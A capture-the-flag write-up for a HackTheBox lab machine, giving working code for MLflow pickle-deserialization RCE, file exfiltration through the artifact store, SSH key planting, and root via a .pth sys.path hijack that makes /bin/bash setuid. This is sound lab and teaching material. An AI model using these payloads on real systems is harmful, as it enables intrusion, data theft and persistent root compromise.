# HackTheBox — SmartHire

**Difficulty:** Medium  
**OS:** Linux  

---

## Overview

SmartHire is a medium Linux machine centred around an AI-powered hiring platform backed by MLflow for model management. The attack chain covers three distinct phases:

1. Discovering and authenticating to a hidden MLflow instance
2. Registering a malicious pickle model via the MLflow REST API to achieve RCE as `svcweb`
3. Escalating to root by hijacking a Python plugin loaded through a writable directory in a NOPASSWD sudo script

---

## Enumeration

### Nmap

```bash
nmap -sC -sV -T4 -p- --min-rate 5000 10.129.44.23
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://smarthire.htb/
```

Only SSH and HTTP. The web server redirects to `smarthire.htb`, so we add it to `/etc/hosts`.

### Virtual Host Fuzzing

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -u http://smarthire.htb \
  -H "Host: FUZZ.smarthire.htb" \
  -fc 301,302
```

```
models    [Status: 401, Size: 137]
```

`models.smarthire.htb` returns a 401 with a `WWW-Authenticate: Basic realm="mlflow"` header — an MLflow instance sitting behind HTTP Basic Auth.

---

## Foothold

### MLflow Default Credentials

Testing default credentials:

```bash
curl -s -u admin:password http://models.smarthire.htb/
```

The response returns the MLflow UI HTML instead of a 401. `admin:password` works.

### Registering on the Main App

The hiring platform at `smarthire.htb` has a `/register` endpoint. Inspecting the form reveals it requires `username`, `company`, and `password` fields (no email).

```bash
curl -X POST http://smarthire.htb/register \
  -d "username=testuser&company=testcorp&password=Password123" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -c cookies.txt
```

Registration succeeds and we are redirected to `/login`.

### Mapping the App's ML Pipeline

After logging in, the dashboard exposes several key endpoints:

- `POST /upload_hiring_data` — accepts a CSV to train an ML model
- `GET /model_info` — returns the registered model's metadata from MLflow
- `POST /predict` — loads the registered model and scores an uploaded CSV

Uploading a minimal training CSV:

```
years_experience,education_level,hired
1,1,0
5,2,1
3,1,0
```

The app trains a scikit-learn model, registers it to MLflow, and returns:

```json
{
  "registered_model": "testcorp-dc5a9779f456-model",
  "status": "success"
}
```

Querying the MLflow registered models API confirms the artifact path:

```
mlflow-artifacts:/0/{run_id}/artifacts/model
```

### MLflow Malicious Pickle RCE

MLflow's `python_function` flavor stores models as pickle files. When the app calls `mlflow.pyfunc.load_model()` on `/predict`, the pickle is deserialized — giving us code execution.

The plan:
1. Create a new MLflow run via the REST API
2. Upload a malicious `MLmodel` manifest and `model.pkl` as artifacts
3. Register a new version of our model pointing to those artifacts
4. Trigger the load via `/predict`

**Confirming RCE with a ping:**

```python
import pickle, os, requests

MLFLOW_URL = "http://models.smarthire.htb"
AUTH = ("admin", "password")
MODEL_NAME = "testcorp-dc5a9779f456-model"
LHOST = "10.10.15.213"

class Shell(object):
    def __reduce__(self):
        return (os.system, (f"ping -c 3 {LHOST}",))

payload = pickle.dumps(Shell())

r = requests.post(f"{MLFLOW_URL}/api/2.0/mlflow/runs/create",
    auth=AUTH, json={"experiment_id": "0"})
run_id = r.json()["run"]["info"]["run_id"]

mlmodel = (
    f"artifact_path: model\nflavors:\n  python_function:\n"
    f"    loader_module: mlflow.sklearn\n    model_path: model.pkl\n"
    f"    python_version: 3.10.12\nmlflow_version: 2.9.2\nrun_id: {run_id}\n"
)

for fname, data in [("MLmodel", mlmodel.encode()), ("model.pkl", payload)]:
    requests.put(
        f"{MLFLOW_URL}/api/2.0/mlflow-artifacts/artifacts/0/{run_id}/artifacts/model/{fname}",
        auth=AUTH, data=data)

requests.post(f"{MLFLOW_URL}/api/2.0/mlflow/model-versions/create", auth=AUTH,
    json={"name": MODEL_NAME,
          "source": f"mlflow-artifacts:/0/{run_id}/artifacts/model",
          "run_id": run_id})
```

Triggering via `/predict` and watching `tcpdump -i tun0 icmp` confirms ICMP packets from the target. RCE is confirmed.

### Exfiltrating Data and SSH Access

Direct reverse shells are blocked by an egress firewall. As a workaround, we use the RCE to write output to `/tmp/` and re-upload it to the MLflow artifact store using an internal `curl` call to `localhost:5000`:

```python
class Shell(object):
    def __reduce__(self):
        cmd = (
            "whoami > /tmp/pwned.txt && id >> /tmp/pwned.txt && "
            "cat /etc/passwd >> /tmp/pwned.txt && "
            "curl -s -u admin:password -X PUT "
            "http://127.0.0.1:5000/api/2.0/mlflow-artifacts/artifacts/0/pwned/pwned.txt "
            "--data-binary @/tmp/pwned.txt"
        )
        return (os.system, (cmd,))
```

Reading the exfiltrated file back:

```bash
curl -s -u admin:password \
  "http://models.smarthire.htb/api/2.0/mlflow-artifacts/artifacts/0/pwned/pwned.txt"
```

```
svcweb
uid=1000(svcweb) gid=1000(svcweb) groups=1000(svcweb),1001(mlflowweb),1002(devs)
```

The app runs as `svcweb`. We drop an SSH public key for a stable shell using the same technique:

```python
class Shell(object):
    def __reduce__(self):
        cmd = (
            "mkdir -p /home/svcweb/.ssh && "
            "echo 'ssh-ed25519 AAAA...wntr@parrot' "
            ">> /home/svcweb/.ssh/authorized_keys && "
            "chmod 600 /home/svcweb/.ssh/authorized_keys"
        )
        return (os.system, (cmd,))
```

```bash
ssh -i /tmp/htb_key svcweb@10.129.44.23
```

---

## Privilege Escalation

### Sudo Enumeration

```bash
sudo -l
```

```
User svcweb may run the following commands on smarthire:
  (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
```

### Analysing mlflowctl.py

```python
from pathlib import Path
import sys, site

BASE_DIR = Path(__file__).resolve().parent
PLUGINS_DIR = BASE_DIR / "plugins"

for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))   # adds each plugin subdir to sys.path

def main():
    import mlflow_actions, backup_models
    ...
```

The script iterates `plugins/`, adds each subdirectory to `sys.path` via `site.addsitedir`, then imports `mlflow_actions` and `backup_models`.

```bash
ls -la /opt/tools/mlflow_ctl/plugins/
```

```
drwxr-xr-x  root root   core/
drwxrwxr-x  root devs   dev/     ← writable by the devs group
```

We are in the `devs` group, so we can write to `dev/`. However, `core` appears first in `iterdir()` output, meaning its modules are found first in `sys.path`.

### sys.path Hijack via .pth File

`site.addsitedir` processes `.pth` files in the directory it adds. Lines beginning with `import` in a `.pth` file are executed as Python code. We can use this to prepend our `dev` directory to `sys.path` at the moment it is processed, before any imports happen:

```bash
cat > /opt/tools/mlflow_ctl/plugins/dev/evil.pth << 'EOF'
import sys; sys.path.insert(0, '/opt/tools/mlflow_ctl/plugins/dev')
EOF

cat > /opt/tools/mlflow_ctl/plugins/dev/mlflow_actions.py << 'EOF'
import os

def check_status():
    os.system("chmod +s /bin/bash")

def restart():
    os.system("chmod +s /bin/bash")
EOF
```

When `site.addsitedir('...dev')` runs, it processes `evil.pth` and inserts `dev` at the front of `sys.path`. The subsequent `import mlflow_actions` now resolves to our malicious version instead of the one in `core`.

```bash
sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
ls -la /bin/bash
```

```
-rwsr-sr-x 1 root root 1396520 Mar 14 2024 /bin/bash
```

```bash
/bin/bash -p
whoami   # root
cat /root/root.txt
```

---

## Summary

| Step | Technique |
|---|---|
| Vhost discovery | `ffuf` subdomain fuzzing |
| MLflow auth | Default credentials (`admin:password`) |
| Initial RCE | Malicious pickle model registered via MLflow REST API |
| Egress bypass | File exfil via `curl` to `localhost` → MLflow artifact store |
| Persistent access | SSH key injection via RCE |
| Privilege escalation | Writable plugin dir + `.pth` file hijacks `sys.path` before root-run Python import |

---

## Key Takeaways

- MLflow should never be exposed with default credentials, especially not adjacent to an application that auto-loads registered models
- `site.addsitedir` is a subtle but powerful `sys.path` manipulation primitive — any writable directory in the plugin chain is a full escalation path
- Egress firewalls blocking reverse shells don't prevent exfiltration when the process can reach internal services like `localhost`
